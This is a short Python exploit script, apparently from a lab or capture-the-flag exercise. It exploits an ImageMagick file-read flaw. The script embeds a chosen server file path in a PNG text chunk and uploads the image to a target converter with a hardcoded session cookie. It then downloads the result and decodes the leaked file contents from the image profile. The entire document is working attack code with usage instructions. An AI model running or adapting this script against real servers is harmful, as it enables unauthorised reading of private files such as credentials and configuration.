#!/usr/bin/python3
import requests
from sys import argv
import subprocess,os
from png import Reader, write_chunks

if len(argv) < 3:
    print("Usage: exploit.py <ADDRESS> <FILE>")
    exit(1)

address = argv[1]
LFI = argv[2]

reader = Reader(filename='source.png')
chunks = list(reader.chunks())

chunk_field = (b"tEXt", f"Profile\x00{LFI}".encode())
chunks.insert(1, chunk_field)

file = open('output.png', 'wb')
write_chunks(file, chunks)
file.close()

headers = {
"Cookie": "PHPSESSID=1cqj671979l51i1v4dt7d2npmn"
}

files = {
    'toConvert': ('output.png', open('output.png', 'rb'), 'image/png')
}
try:
    response = requests.post(address,files=files,headers=headers,allow_redirects=True)
except ConnectionError:
    print("Check your url")
    quit()
image_url = response.url[31:-15]
filename = image_url[29:]
#print(filename)

#downloading the file from the web app

subprocess.run(['wget',image_url],stdout=open(os.devnull,"w"),stderr=subprocess.STDOUT)
output=''
proc = subprocess.Popen(['./magick','identify','-verbose',filename],stdout=subprocess.PIPE)
output = proc.stdout.read()
minus_upper = str(output).split("Raw profile type: \\n\\n")[1]
minus_lower = minus_upper.split("\\n\\n    signature:")
hex_array=minus_lower[0].split('\\n')
hexcode = ''
for i in range(1,len(hex_array)):
    hexcode+=hex_array[i]+'\n'
print(bytes.fromhex(hexcode))
